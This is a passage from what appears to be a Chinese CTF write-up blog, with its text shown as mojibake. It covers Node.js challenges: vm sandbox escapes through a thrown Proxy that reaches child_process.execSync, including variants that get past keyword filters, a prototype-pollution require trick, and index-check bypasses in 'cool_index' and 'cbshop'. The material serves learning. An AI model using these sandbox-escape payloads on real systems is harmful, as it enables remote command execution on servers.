class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-string">`</span><br><span class="hljs-string">    throw new Proxy(&#123;&#125;, &#123;</span><br><span class="hljs-string">        get: function()&#123;</span><br><span class="hljs-string">            const cc = arguments.callee.caller;</span><br><span class="hljs-string">            const p = (cc.constructor.constructor(&#x27;return process&#x27;))();</span><br><span class="hljs-string">            return p.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;ls&#x27;).toString();</span><br><span class="hljs-string">        &#125;</span><br><span class="hljs-string">    &#125;)</span><br><span class="hljs-string">`</span>;<br></code></pre></td></tr></table></figure><p>ä½†æ³¨æ„è¿™é‡Œ<code>processå’Œexec</code>è¢«è¿‡æ»¤äº†ï¼Œå½“æ—¶æƒ³äº†å¾ˆä¹…è¦æ€ä¹ˆç»•è¿‡ï¼Œçœ‹äº†è¿™ç¯‡æ–‡ç« (ä½†æ˜¯å½“æ—¶ä¸çŸ¥é“æ€ä¹ˆå¥—è¿›å»)ï¼š</p><p><a href="https://www.anquanke.com/post/id/237032">jsç»•è¿‡</a></p><p>ç½‘ä¸Šçœ‹çš„å…¶å®ƒå¸ˆå‚…çš„å†™æ³•ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Proxy</span>(&#123;&#125;, &#123;<br>        <span class="hljs-attr">get</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;<br>            <span class="hljs-keyword">const</span> cc = <span class="hljs-variable language_">arguments</span>.<span class="hljs-property">callee</span>.<span class="hljs-property">caller</span>;<br>            <span class="hljs-keyword">const</span> p = (cc.<span class="hljs-property">constructor</span>.<span class="hljs-title function_">constructor</span>(<span class="hljs-params"><span class="hljs-string">&#x27;return procBess&#x27;</span>.replace(<span class="hljs-string">&#x27;B&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>)</span>))();<br>            <span class="hljs-keyword">const</span> obj = p.<span class="hljs-property">mainModule</span>.<span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;child_procBess&#x27;</span>.<span class="hljs-title function_">replace</span>(<span class="hljs-string">&#x27;B&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>));<br>            <span class="hljs-keyword">const</span> ex = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">getOwnPropertyDescriptor</span>(obj, <span class="hljs-string">&#x27;exeicSync&#x27;</span>.<span class="hljs-title function_">replace</span>(<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>));<br>            <span class="hljs-keyword">return</span> ex.<span class="hljs-title function_">value</span>(<span class="hljs-string">&#x27;whoami&#x27;</span>).<span class="hljs-title function_">toString</span>();<br>        &#125;<br>    &#125;)<br></code></pre></td></tr></table></figure><p>è¿˜æœ‰å…¶å®ƒæ–¹æ³•ï¼š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Proxy</span>(&#123;&#125;, &#123;<br><br>  <span class="hljs-attr">get</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;<br><br>  <span class="hljs-keyword">const</span> cc = <span class="hljs-variable language_">arguments</span>.<span class="hljs-property">callee</span>.<span class="hljs-property">caller</span>;<br><br>   <span class="hljs-keyword">const</span> aa = <span class="hljs-string">&#x27;return Process&#x27;</span>.<span class="hljs-title function_">toLowerCase</span>();<br><br>   <span class="hljs-keyword">const</span> bb = <span class="hljs-string">&#x27;child_pRocess&#x27;</span>.<span class="hljs-title function_">toLowerCase</span>();<br><br>   <span class="hljs-keyword">const</span> p = (cc.<span class="hljs-property">constructor</span>.<span class="hljs-title function_">constructor</span>(<span class="hljs-params">aa</span>))().<span class="hljs-property">mainModule</span>.<span class="hljs-built_in">require</span>(bb);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">get</span>(<span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">get</span>(p, <span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">ownKeys</span>(p).<span class="hljs-title function_">find</span>(<span class="hljs-function"><span class="hljs-params">x</span>=&gt;</span>x.<span class="hljs-title function_">startsWith</span>(<span class="hljs-string">&#x27;ex&#x27;</span>)))(<span class="hljs-string">&#x27;ls&#x27;</span>));<br><br>  &#125;<br><br>&#125;)<br></code></pre></td></tr></table></figure><p>è¿˜æœ‰å…¶å®ƒè§£æ³•ï¼š<a href="http://49.232.222.195/index.php/archives/714/">å‚è€ƒæ–‡ç« </a></p><p><code>js</code>è¿™ç§è¯­è¨€å¤ªçµæ´»äº†</p><p>å”‰ï¼Œå­¦</p><p>å®˜æ–¹<code>wp</code>:(åŸå‹é“¾æ±¡æŸ“+æ²™ç®±é€ƒé€¸)ï¼š</p><p>é¦–å…ˆ<code>process.__filename</code>è¿™ä¸œè¥¿å­˜åœ¨åŸå‹é“¾æ±¡æŸ“(å’Œæ²™ç®±é€ƒé€¸é…åˆ):</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Proxy</span>(&#123;&#125;, &#123;<br> <span class="hljs-attr">get</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;<br> <span class="hljs-keyword">const</span> cc = <span class="hljs-variable language_">arguments</span>.<span class="hljs-property">callee</span>.<span class="hljs-property">caller</span>;<br> cc.<span class="hljs-property">__proto__</span>.<span class="hljs-property">__proto__</span>.<span class="hljs-property">__filename</span> = <span class="hljs-string">&quot;/app/hack.js&quot;</span>;<br> &#125;<br> &#125;)<br><span class="hljs-comment">//hack.js</span><br> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;shell.js&#x27;</span>);<br><span class="hljs-comment">//åŒç†è¯»shell.js</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;shell&quot;</span>);<br><span class="hljs-keyword">const</span> p = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;child_process&#x27;</span>);<br>p.<span class="hljs-title function_">execSync</span>(process.<span class="hljs-property">env</span>.<span class="hljs-property">command</span>);<br></code></pre></td></tr></table></figure><p>ç„¶åå°±æ˜¯ä¸€ä¸ª[requireä»»æ„æ–‡ä»¶åŒ…å«](<a href="https://hujiekang.top/posts/nodejs-require-rce/#require%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%89%A7%E8%A1%8C">Node.js require () RCE å¤ç° | Jiekang Huâ€™s Blog (hujiekang.top)</a>)</p><h2 id="GFCTF2024-cool-index"><a href="#GFCTF2024-cool-index" class="headerlink" title="[GFCTF2024]cool_index"></a>[GFCTF2024]cool_index</h2><p>è´´äº›å…³é”®ä»£ç ï¼Œä¸»è¦é€»è¾‘å°±æ˜¯æ³¨å†Œæ—¶è¾“å…¥ç”¨æˆ·åå’Œæ³¨å†Œç ï¼Œåç«¯ä¼šè¿›è¡Œæ ¡éªŒï¼Œå¦‚æœæ³¨å†Œç ç­‰äºç‰¹å®šå€¼å°±ä¼šç»™<code>premium</code>èº«ä»½ï¼Œå¦åˆ™å°±æ˜¯<code>guest</code>èº«ä»½ã€‚<code>premium</code>ç”¨æˆ·èƒ½çœ‹<code>flag</code></p><p>è´´äº›å…³é”®ä»£ç ï¼š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">//server.js</span><br>app.<span class="hljs-title function_">post</span>(<span class="hljs-string">&quot;/register&quot;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>    <span class="hljs-keyword">const</span> &#123; username, voucher &#125; = req.<span class="hljs-property">body</span>;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> username === <span class="hljs-string">&quot;string&quot;</span> &amp;&amp; (!voucher || <span class="hljs-keyword">typeof</span> voucher === <span class="hljs-string">&quot;string&quot;</span>)) &#123;<br>        <span class="hljs-keyword">const</span> subscription = (voucher === <span class="hljs-variable constant_">FLAG</span> + <span class="hljs-variable constant_">JWT_SECRET</span> ? <span class="hljs-string">&quot;premium&quot;</span> : <span class="hljs-string">&quot;guest&quot;</span>);<br>        <span class="hljs-keyword">if</span> (voucher &amp;&amp; subscription === <span class="hljs-string">&quot;guest&quot;</span>) &#123;<br>            <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">400</span>).<span class="hljs-title function_">json</span>(&#123; <span class="hljs-attr">message</span>: <span class="hljs-string">&quot;é‚€è¯·ç æ— æ•ˆ&quot;</span> &#125;);<br>        &#125;<br>        <span class="hljs-keyword">const</span> userToken = jwt.<span class="hljs-title function_">sign</span>(&#123; username, subscription &#125;, <span class="hljs-variable constant_">JWT_SECRET</span>, &#123;<br>            <span class="hljs-attr">expiresIn</span>: <span class="hljs-string">&quot;1d&quot;</span>,<br>        &#125;);<br>        res.<span class="hljs-title function_">cookie</span>(<span class="hljs-string">&quot;token&quot;</span>, userToken, &#123; <span class="hljs-attr">httpOnly</span>: <span class="hljs-literal">true</span> &#125;);<br>        <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">json</span>(&#123; <span class="hljs-attr">message</span>: <span class="hljs-string">&quot;æ³¨å†ŒæˆåŠŸ&quot;</span>, subscription &#125;);<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">400</span>).<span class="hljs-title function_">json</span>(&#123; <span class="hljs-attr">message</span>: <span class="hljs-string">&quot;ç”¨æˆ·åæˆ–é‚€è¯·ç æ— æ•ˆ&quot;</span> &#125;);<br>&#125;);<br>app.<span class="hljs-title function_">post</span>(<span class="hljs-string">&quot;/article&quot;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>    <span class="hljs-keyword">const</span> token = req.<span class="hljs-property">cookies</span>.<span class="hljs-property">token</span>;<br>    <span class="hljs-keyword">if</span> (token) &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-keyword">const</span> decoded = jwt.<span class="hljs-title function_">verify</span>(token, <span class="hljs-variable constant_">JWT_SECRET</span>);<br>            <span class="hljs-keyword">let</span> index = req.<span class="hljs-property">body</span>.<span class="hljs-property">index</span>;<br>            <span class="hljs-keyword">if</span> (req.<span class="hljs-property">body</span>.<span class="hljs-property">index</span> &lt; <span class="hljs-number">0</span>) &#123;<br>                <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">400</span>).<span class="hljs-title function_">json</span>(&#123; <span class="hljs-attr">message</span>: <span class="hljs-string">&quot;ä½ çŸ¥é“æˆ‘è¦è¯´ä»€ä¹ˆ&quot;</span> &#125;);<br>            &#125;<br>            <span class="hljs-keyword">if</span> (decoded.<span class="hljs-property">subscription</span> !== <span class="hljs-string">&quot;premium&quot;</span> &amp;&amp; index &gt;= <span class="hljs-number">7</span>) &#123;<br>                <span class="hljs-keyword">return</span> res<br>                    .<span class="hljs-title function_">status</span>(<span class="hljs-number">403</span>)<br>                    .<span class="hljs-title function_">json</span>(&#123; <span class="hljs-attr">message</span>: <span class="hljs-string">&quot;è®¢é˜…é«˜çº§ä¼šå‘˜ä»¥è§£é”&quot;</span> &#125;);<br>            &#125;<br>            index = <span class="hljs-built_in">parseInt</span>(index);<br>            <span class="hljs-keyword">if</span> (<span class="hljs-title class_">Number</span>.<span class="hljs-built_in">isNaN</span>(index) || index &gt; articles.<span class="hljs-property">length</span> - <span class="hljs-number">1</span>) &#123;<br>                <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">400</span>).<span class="hljs-title function_">json</span>(&#123; <span class="hljs-attr">message</span>: <span class="hljs-string">&quot;ä½ çŸ¥é“æˆ‘è¦è¯´ä»€ä¹ˆ&quot;</span> &#125;);<br>            &#125;<br><br>            <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">json</span>(articles[index]);<br>        &#125; <span class="hljs-keyword">catch</span> (error) &#123;<br>            res.<span class="hljs-title function_">clearCookie</span>(<span class="hljs-string">&quot;token&quot;</span>);<br>            <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">403</span>).<span class="hljs-title function_">json</span>(&#123; <span class="hljs-attr">message</span>: <span class="hljs-string">&quot;é‡æ–°ç™»å½•ç½¢&quot;</span> &#125;);<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">403</span>).<span class="hljs-title function_">json</span>(&#123; <span class="hljs-attr">message</span>: <span class="hljs-string">&quot;æœªç™»å½•&quot;</span> &#125;);<br>    &#125;<br></code></pre></td></tr></table></figure><p><code>premium</code>åˆ¤æ–­é€»è¾‘ï¼š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">voucher === <span class="hljs-variable constant_">FLAG</span> + <span class="hljs-variable constant_">JWT_SECRET</span><br></code></pre></td></tr></table></figure><p>è¿™ä¸ªæ„Ÿè§‰æ²¡å•¥åˆ©ç”¨ç‚¹ï¼Œå¦‚æœæˆ‘éƒ½çŸ¥é“FLAGäº†è¿˜å»å¼„å®ƒå¹²å•¥ã€‚ã€‚çŒœæµ‹æ˜¯æŸç§æ–¹å¼è¯»<code>JWT_SECRET</code>ç„¶åè¿›è¡Œä¼ªé€ ã€‚</p><p>åé¢çœ‹äº†<code>wp</code>ï¼Œè¿™é‡Œç›´æ¥ä¼ <code>&#123;&quot;index&quot;:&quot;7+1&quot;&#125;</code>å°±è¡Œã€‚ã€‚å”‰</p><p>è¿™ä¹ˆä¼ å¯ä»¥ç»•è¿‡ç¬¬ä¸€ä¸ª<code>if</code>çš„åˆ¤æ–­ï¼š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs js">index = <span class="hljs-string">&quot;7+1&quot;</span>;<br><span class="hljs-keyword">if</span> (index &gt;= <span class="hljs-number">7</span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;å¤§äºæˆ–ç­‰äº7ï¼ï¼&quot;</span>)<br>&#125;<br>index = <span class="hljs-built_in">parseInt</span>(index);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(index)<br><span class="hljs-comment">//ç»“æœï¼š7</span><br></code></pre></td></tr></table></figure><p>ç„¶åä¼šè¿›ç¬¬äºŒä¸ª<code>if</code>ï¼Œæ»¡è¶³<code>index</code>ä¸å¤§äº<code>7</code>ï¼Œè¾“å‡º<code>flag</code>ã€‚</p><p>åé¢çœ‹äº†å®˜æ–¹<code>wp</code>ï¼Œè¿˜æœ‰å…¶å®ƒè§£æ³•ï¼Œè¿™é‡Œç›´æ¥å¤åˆ¶ç²˜è´´äº†ï¼š</p><p>åŸæœ¬<code>parseInt()</code>æ¥æ”¶å­—ç¬¦ä¸²å‚æ•°å¹¶è½¬ä¸ºæ•´å½¢æ•°æ®ç±»å‹ï¼Œä½†å¦‚æœç›®æ ‡æ˜¯ Node ä¸­çš„<code>big int</code>ï¼Œè½¬æ¢æ—¶ä¼šé€ æˆç²¾åº¦æŸå¤±ï¼Œä½†èƒ½ç»•è¿‡æ­£å¸¸çš„å¤§å°æ¯”è¾ƒã€‚</p><blockquote><p>åœ¨ Node.js ä¸­ï¼Œ<code>BigInt</code> æ˜¯ä¸€ç§æ•°æ®ç±»å‹ï¼Œç”¨äºè¡¨ç¤ºå¤§æ•´æ•°ï¼Œå³è¶…å‡º JavaScript åŸç”Ÿ <code>Number</code> ç±»å‹èŒƒå›´çš„æ•´æ•°å€¼ã€‚JavaScript ä¸­çš„æ™®é€š <code>Number</code> ç±»å‹æœ‰ä¸€ä¸ªæœ‰é™çš„èŒƒå›´ï¼Œè¶…å‡ºè¿™ä¸ªèŒƒå›´çš„æ•´æ•°å€¼æ— æ³•ç²¾ç¡®è¡¨ç¤ºï¼Œä¼šå¯¼è‡´ç²¾åº¦ä¸¢å¤±æˆ–æº¢å‡ºã€‚</p><p><code>BigInt</code> ç±»å‹é€šè¿‡åœ¨æ•´æ•°å€¼åé¢æ·»åŠ  <code>n</code> åç¼€æ¥è¡¨ç¤ºï¼Œä¾‹å¦‚ <code>1234567890123456789012345678901234567890n</code>ã€‚å®ƒå…è®¸è¡¨ç¤ºçš„æ•´æ•°èŒƒå›´æ¯” <code>Number</code> ç±»å‹æ›´å¤§ï¼Œå› æ­¤åœ¨éœ€è¦å¤„ç†éå¸¸å¤§çš„æ•´æ•°æ—¶éå¸¸æœ‰ç”¨ã€‚</p></blockquote><p><img src="/img/images.png" alt="images"></p><p><img src="/img/bigbigint.png" alt="bigbigint"></p><p>æˆ–è€…ï¼šæ•°å­—åˆ†éš”ç¬¦ä¹Ÿå¯ä»¥ç»•è¿‡å¤§å°æ¯”è¾ƒã€‚</p><p><img src="/img/fenge1.png" alt="fenge1"></p><p><img src="/img/fenge2.png" alt="fenge2"></p><h2 id="cbshop"><a href="#cbshop" class="headerlink" title="cbshop"></a>cbshop</h2><p>è¿™é¢˜å†™çš„ä¸å¤ªå¥½ï¼Œç§»æ­¥ï¼š<a href="https://www.ctfiot.com/57949.html">å‚è€ƒæ–‡ç« </a></p><p>ä¸»è¦çœ‹<code>app.js</code>ï¼Œæ”¾ä¸€äº›æ¯”è¾ƒå…³é”®çš„åœ°æ–¹ï¼š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> adminUser = &#123;<br>    <span class="hljs-attr">username</span>: <span class="hljs-string">&quot;admin&quot;</span>,<br>    <span class="hljs-attr">password</span>: <span class="hljs-string">&quot;ğŸ˜€adminğŸ˜€&quot;</span>,<br>    <span class="hljs-attr">money</span>: <span class="hljs-number">9999</span><br>&#125;;<br><span class="hljs-comment">//å®šä¹‰äº†adminUserå¯¹è±¡ï¼Œç»™äº†ç”¨æˆ·åå¯†ç å’Œmoney</span><br><span class="hljs-comment">//loginè·¯ç”±ï¼š</span><br>    <span class="hljs-keyword">if</span>(username === adminUser.<span class="hljs-property">username</span> &amp;&amp; password === adminUser.<span class="hljs-property">password</span>.<span class="hljs-title function_">substring</span>(<span class="hljs-number">1</span>,<span class="hljs-number">6</span>)) &#123;<span class="hljs-comment">//only admin need password</span><br>        req.<span class="hljs-property">session</span>.<span class="hljs-property">username</span> = username;<br>        req.<span class="hljs-property">session</span>.<span class="hljs-property">money</span> = adminUser.<span class="hljs-property">money</span>;<br>        <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">json</span>(&#123;<br>            <span class="hljs-attr">code</span>: <span class="hljs-number">1</span>,<br>            <span class="hljs-attr">username</span>: username,<br>            <span class="hljs-attr">money</span>: req.<span class="hljs-property">session</span>.<span class="hljs-property">money</span>,<br>            <span class="hljs-attr">msg</span>: <span class="hljs-string">&#x27;admin login success!&#x27;</span><br>        &#125;);<br>    &#125;<br><span class="hljs-comment">//buyApi</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">buyApi</span>(<span class="hljs-params">user, product</span>) &#123;<br>    <span class="hljs-keyword">let</span> order = &#123;&#125;;<br>    <span class="hljs-keyword">if</span>(!order[user.<span class="hljs-property">username</span>]) &#123;<br>        order[user.<span class="hljs-property">username</span>] = &#123;&#125;;<br>    &#125;<br><br>    <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">assign</span>(order[user.<span class="hljs-property">username</span>], product);<br><br>    <span class="hljs-keyword">if</span>(product.<span class="hljs-property">id</span> === <span class="hljs-number">1</span>) &#123;             <span class="hljs-comment">//buy fakeFlag</span><br>        <span class="hljs-keyword">if</span>(user.<span class="hljs-property">money</span> &gt;= <span class="hljs-number">10</span>) &#123;<br>            user.<span class="hljs-property">money</span> -= <span class="hljs-number">10</span>;<br>            <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">assign</span>(order, &#123; <span class="hljs-attr">msg</span>:  fs.<span class="hljs-title function_">readFileSync</span>(<span class="hljs-string">&#x27;/fakeFlag&#x27;</span>).<span class="hljs-title function_">toString</span>() &#125;);<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">assign</span>(order,&#123; <span class="hljs-attr">msg</span>: <span class="hljs-string">&quot;you don&#x27;t have enough money!&quot;</span> &#125;);<br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(product.<span class="hljs-property">id</span> === <span class="hljs-number">2</span>) &#123;        <span class="hljs-comment">//buy flag</span><br>        <span class="hljs-keyword">if</span>(user.<span class="hljs-property">money</span> &gt;= <span class="hljs-number">11</span> &amp;&amp; user.<span class="hljs-property">token</span>) &#123;  <span class="hljs-comment">//do u have token?</span><br>            <span class="hljs-keyword">if</span>(<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(product).<span class="hljs-title function_">includes</span>(<span class="hljs-string">&quot;flag&quot;</span>)) &#123;<br>                <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">assign</span>(order,&#123; <span class="hljs-attr">msg</span>: <span class="hljs-string">&quot;hint: go to &#x27;readFileSync&#x27;!!!!&quot;</span> &#125;);<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                user.<span class="hljs-property">money</span> -= <span class="hljs-number">11</span>;<br>                <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">assign</span>(order,&#123; <span class="hljs-attr">msg</span>: fs.<span class="hljs-title function_">readFileSync</span>(product.<span class="hljs-property">name</span>).<span class="hljs-title function_">toString</span>() &#125;);<br>            &#125;<br>        &#125;<span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">assign</span>(order,&#123; <span class="hljs-attr">msg</span>: <span class="hljs-string">&quot;nononono!&quot;</span> &#125;);<br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">assign</span>(order,&#123; <span class="hljs-attr">code</span>: <span class="hljs-number">0</span>, <span class="hljs-attr">msg</span>: <span class="hljs-string">&quot;no such product!&quot;</span> &#125;);<br>    &#125;<br>    <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">assign</span>(order, &#123; <span class="hljs-attr">username</span>: user.<span class="hljs-property">username</span>, <span class="hljs-attr">code</span>: <span class="hljs-number">3</span>, <span class="hljs-attr">money</span>: user.<span class="hljs-property">money</span> &#125;);<br>    <span class="hljs-keyword">return</span> order;<br>&#125;<br><span class="hljs-comment">//script.js</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">buy</span>(<span class="hljs-params">product</span>) &#123;<br>    <span class="hljs-title function_">fetch</span>(<span class="hljs-string">&#x27;/buy&#x27;</span>, &#123;<br>        <span class="hljs-attr">method</span>: <span class="hljs-string">&#x27;POST&#x27;</span>,<br>        <span class="hljs-attr">headers</span>: &#123;<br>            <span class="hljs-string">&#x27;Content-Type&#x27;</span>: <span class="hljs-string">&#x27;application/json&#x27;</span><br>        &#125;,<br>        <span class="hljs-attr">body</span>: <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(&#123;<br>            <span class="hljs-string">&#x27;name&#x27;</span>: <span class="hljs-string">&#x27;/&#x27;</span> + product.<span class="hljs-property">name</span>, <br>            <span class="hljs-string">&#x27;id&#x27;</span>: <span class="hljs-title class_">Number</span>(product.<span class="hljs-title function_">getAttribute</span>(<span class="hljs-string">&#x27;idNum&#x27;</span>))<br>        &#125;)<br>    &#125;)<br>    .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">response</span> =&gt;</span> response.<span class="hljs-title function_">json</span>())<br>    .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">data</span> =&gt;</span> <span class="hljs-title function_">displayChange</span>(data));<br>&#125;<br></code></pre></td></tr></table></figure><p>å•†åº—ç±»å‹é¢˜ç›®ï¼Œå¤§è‡´é€»è¾‘å°±æ˜¯å¾—ä»¥<code>admin</code>ç”¨æˆ·çš„èº«ä»½ç™»å½•(ç»™äº†<code>adminUser</code>å¯¹è±¡)ï¼Œ<code>admin</code>çš„<code>money</code>æ˜¯<code>9999</code>ã€‚å…ˆçœ‹æ€ä¹ˆæ‰èƒ½è·å¾—<code>admin</code>è¿™ä¸ªèº«ä»½ï¼š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">if</span>(username === adminUser.<span class="hljs-property">username</span> &amp;&amp; password === adminUser.<span class="hljs-property">password</span>.<span class="hljs-title function_">substring</span>(<span class="hljs-number">1</span>,<span class="hljs-number">6</span>)) &#123;<span class="hljs-comment">//only admin need password</span><br>       req.<span class="hljs-property">session</span>.<span class="hljs-property">username</span> = username;<br>       req.<span class="hljs-property">session</span>.<span class="hljs-property">money</span> = adminUser.<span class="hljs-property">money</span>;<br></code></pre></td></tr></table></figure><p>ç»“åˆ<code>const adminUser</code>ï¼ŒæŠŠ<code>ğŸ˜€adminğŸ˜€</code>æˆªå–ä¸€ä¸‹ï¼Œç›´æ¥åœ¨æ§åˆ¶å°ä¸Šè¿è¡Œï¼š</p><p><img src="/img/cbshop2.png" alt="cbshop2"></p><p><code>console.log(&quot;ğŸ˜€adminğŸ˜€&quot;.substring(1,6))</code></p><p>æˆåŠŸç™»å½•ï¼š</p><p><img src="/img/cbshop3.png" alt="cbshop3"></p><p>ç„¶åå°±æ˜¯<code>buyApi</code>ä¸‹<code>buyflag</code>çš„é€»è¾‘ï¼š</p><p><img src="/img/cbshop4.png" alt="cbshop4"></p><p>é¦–å…ˆå¾—æ»¡è¶³<code>if(user.money &gt;= 11 &amp;&amp; 